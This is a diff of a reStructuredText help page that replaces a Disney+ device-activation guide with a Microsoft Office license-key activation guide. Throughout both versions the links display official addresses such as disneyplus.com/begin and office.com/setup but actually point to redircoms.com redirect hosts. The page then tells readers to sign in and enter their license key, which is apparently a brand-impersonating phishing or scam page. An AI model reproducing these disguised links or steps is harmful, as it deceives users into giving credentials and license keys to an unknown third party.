@@ -1,5 +1,5 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+Steps to Activate Office Using License Key: Updated 3 Days
 ##################
 
 .. meta::
@@ -14,35 +14,40 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: microsoft365.com/setup
+   :target: https://ms.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+If you’ve received a license key for Microsoft Office, activating your software is quick and secure via `microsoft365.com/setup <https://ms.redircoms.com>`_ or `office.com/setup <https://ms.redircoms.com>`_. This updated guide walks you through the latest activation steps as of 3 days ago.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate Office Using License Key
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open a browser on your computer and visit `microsoft365.com/setup <https://ms.redircoms.com>`_ or `office.com/setup <https://ms.redircoms.com>`_.
+2. Sign in with your Microsoft account or create a new one.
+3. Enter your **25-character Office license key** from your retail card or email.
+4. Click **Next** to verify and link the key with your Microsoft account.
+5. After verification, click **Install** to download the Office setup file.
 
 **********
-What to Do After Activation
+Installation & Activation Process
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+1. Run the downloaded setup file and follow the on-screen instructions.
+2. Once installed, launch any Office application like Word or Excel.
+3. Sign in with your Microsoft account to activate Office.
+4. Office will automatically detect the linked license and complete activation.
+5. You’re now ready to use Office on your device.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Useful Tips After Activation
+**********
+
+- You can install Office on multiple devices (as per your license terms).
+- Access your Office license anytime via your Microsoft account dashboard.
+- Keep your license key stored safely for future reference.
